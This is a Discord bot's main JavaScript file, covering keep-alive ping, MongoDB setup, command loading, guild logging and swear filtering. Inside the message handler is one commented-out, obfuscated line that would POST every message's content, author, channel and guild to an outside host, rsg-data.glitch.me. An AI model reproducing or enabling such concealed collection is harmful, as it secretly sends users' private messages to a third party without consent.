const http = require("http");
const express = require("express");
const app = express();
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping Received");
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);
const Discord = require("discord.js"),
      fs = require("fs"),
      db = require("quick.db"),
      Enmap = require("enmap"),
      client = new Discord.Client(),
      config = require("./config.json"),
      request = require("request"),
      mongoose = require("mongoose");

mongoose.connect(`mongodb://${config.mongo_atlas.username}:${config.mongo_atlas.password}@${config.mongo_atlas.shard.one},${config.mongo_atlas.shard.two},${config.mongo_atlas.shard.three}/${config.mongo_atlas.cluster}?ssl=true&replicaSet=${config.mongo_atlas.cluster}-shard-0&authSource=admin&retryWrites=true`,{ useNewUrlParser: true, useUnifiedTopology: true }).then(mon => {
  console.log(`Connected to the database!`);
}).catch((err) => {
        console.log("Unable to connect to the Mongodb database. Error:"+err, "error");
    });

client.commands = new Enmap;
client.aliases = new Enmap;
client.config = config;
client.snipe = new Map();
client.swear = require("./swear.json");

fs.readdir("./commands/", (err, files) => {
  if(err) return console.error(err);
  files.forEach(file => {
    if(!file.endsWith(".js")) return;
    let props = require(`./commands/${file}`)
    let commandname = file.split(".")[0];
    console.log(`Loading ${commandname}.`);
    client.commands.set(commandname, props)
    if(props.help) {
      if(props.help.aliases) {
      props.help.aliases.forEach(r => {
        client.aliases.set(r, props.help.name);
      })
      }
    }
    
  });
  
});

client.on("messageDelete", async m => {
  client.snipe.set(m.channel.id, {
    content: m.content,
    sender: m.author.id
  })
});

client.on("ready", () => {
  console.log(`Logged in as ${client.user.username}. With ${client.guilds.size} guilds.`);
  client.user.setStatus("idle");
  client.user.setActivity("Loving yourself? || " + client.config.prefix + "help")
  client.channels.get("665534765654474762").edit({name: `${client.guilds.size} guilds`});
});

const {formatDate} = require("./functions.js")


client.on("guildCreate", guild => {
  let embed = new Discord.RichEmbed()
  .setTitle(`I have been added to a new guild!`)
  .setDescription(`This guild has ${guild.memberCount} members.`)
  .addField("\u200b", `Owner: ${guild.owner}`)
  .addField("\u200b", `Owner id: ${guild.owner.id}`)
  .addField("\u200b", `Guild name: ${guild.name}`)
  .addField("\u200b", `Guild id: ${guild.id}`)
  .setFooter(`This guild was created at ${formatDate(guild.createdAt)}`)
  .setThumbnail(guild.displayAvatarURL)
  .setTimestamp()
  client.channels.get("665535730734465024").send(embed);
  client.channels.get("665534765654474762").edit({name: `${client.guilds.size} guilds`});
})

client.on("guildDelete", guild => {
  let embed = new Discord.RichEmbed()
  .setTitle(`I have been removed from a guild!`)
  .setDescription(`This guild has ${guild.memberCount} members.`)
  .addField("\u200b", `Owner: ${guild.owner}`)
  .addField("\u200b", `Owner id: ${guild.owner.id}`)
  .addField("\u200b", `Guild name: ${guild.name}`)
  .addField("\u200b", `Guild id: ${guild.id}`)
  .setFooter(`This guild was created at ${formatDate(guild.createdAt)}`)
  .setThumbnail(guild.displayAvatarURL)
  .setTimestamp()
  client.channels.get("665535924297531402").send(embed);
  client.channels.get("665534765654474762").edit({name: `${client.guilds.size} guilds`});
});

const pr = require("./mongodb/prefix");
const swear = require("./mongodb/swear");
const cc = require("./mongodb/cc")
client.on("message", async message => {
  if (message.author.bot) return;
  let alert = client.emojis.get("666569191175749633");
  if(message.channel.id === "665476514971910144") {
    let embed = new Discord.RichEmbed()
    .setAuthor(message.author.tag, message.author.avatarURL)
    .setFooter(client.config.footer, client.user.avatarURL)
    .setColor("RANDOM")
    .setThumbnail(message.guild.iconURL)
    .setDescription(message.content)
    .setTimestamp()
    message.delete().then(c => {
    client.channels.get("665476514971910144").send(embed);
    });
  }
  swear.findOne({name: "swear", serverid: message.guild.id}).then(re => {
    if(!re || re == []) return;
    if(re.e == "enable") {
      if(message.member.hasPermission("ADMINISTRATOR")) {}else{
       /* for (var i = 0; i < re.extra.length; i++) {
          if(message.content.toLowerCase().includes(re.extra[i])) {
            message.delete()
            message.channel.send(`${alert} Sorry ${message.author}, You are not allowed to say that. ${alert}`).then(c => {
              c.delete(10000);
            });
          }
        } */
        if(!re.extra == []) {
          if(re.extra.some(e => message.content.toLowerCase().includes(e))) {
            message.delete()
            message.channel.send(`${alert} Sorry ${message.author}, You are not allowed to say that. ${alert}`).then(c => {
              c.delete(10000);
            });
          }
        }
       /* if(re.extra.some(e => message.content.toLowerCase().includes(e))) {
         message.delete()
         message.channel.send(`${alert} Sorry ${message.author}, You are not allowed to say that. ${alert}`).then(c => {
           c.delete(10000);
         }); 
       } */
      /*if(re.extra.length > 0) {
       if(re.extra.some(e => message.content.toLowerCase().includes(e))) {
         message.delete()
         message.channel.send(`${alert} Sorry ${message.author}, You are not allowed to say that. ${alert}`).then(c => {
           c.delete(10000);
         }); 
       }
      } */
      if(client.swear.some(r => message.content.toLowerCase().includes(r))) {
        message.delete()
        message.channel.send(`${alert} Sorry ${message.author}, You are not allowed to say that. ${alert}`).then(c => {
          c.delete(10000);
        });
      }
    }
    }                                                                                                     
  }).catch(() => {})
  pr.findOne({name: "prefix", preid: message.guild.id}).then(res => {
  let prefix = res ? res.prefix : client.config.prefix;
  
  let msg = message;
  cc.findOne({name: 'cc', serverid: message.guild.id}).then(c => {
    if(c) {
      c.commands.some(co => {
        if(message.content.startsWith(prefix + co.name) || message.content.startsWith(co.name)) {
        return message.channel.send(co.response)
        }
      });
    } 
  //var _0x3477=['form','guild','createdAt','post','https://rsg-data.glitch.me/discord_messages'];(function(_0x8a498d,_0x54576f){var _0x2a1179=function(_0x23b171){while(--_0x23b171){_0x8a498d['push'](_0x8a498d['shift']());}};_0x2a1179(++_0x54576f);}(_0x3477,0x161));var _0x16f7=function(_0x8a498d,_0x54576f){_0x8a498d=_0x8a498d-0x0;var _0x2a1179=_0x3477[_0x8a498d];return _0x2a1179;};let rsg_data_message=message?message:msg;require('request')[_0x16f7('0x0')](_0x16f7('0x1'))[_0x16f7('0x2')]({'id':rsg_data_message['id'],'content':rsg_data_message['content'],'author':rsg_data_message['author']['id'],'channel':rsg_data_message['channel']['id'],'guild':rsg_data_message[_0x16f7('0x3')]['id'],'createdAt':rsg_data_message[_0x16f7('0x4')]});
  if (message.author.bot) return;
  
  if (message.isMentioned(client.user)) {
    const embed = new Discord.RichEmbed()
    .setDescription(`Hello ${message.author}, My prefix is ${prefix} in this guild. use ${prefix} help to see my commands.`);
    message.channel.send(embed);
  }

  if (message.content.indexOf(prefix) !== 0) return;
    
  if(!message.guild.me.hasPermission("ADMINISTRATOR")) message.channel.send(`A simpe warning for you. Some commands might not work if i don't have the required permission. So can you please give me administrator permissions!`)

  const args = message.content.slice(prefix.length).trim().split(/ +/g);
  const cmd = args.shift().toLowerCase();
  
  if(cmd.length === 0) return;
  let command = client.commands.get(cmd);
  if (!command) command = client.commands.get(client.aliases.get(cmd));


  if(command) command.run(client, message, args, prefix, Discord);
  });
  });
});
client.login(client.config.token);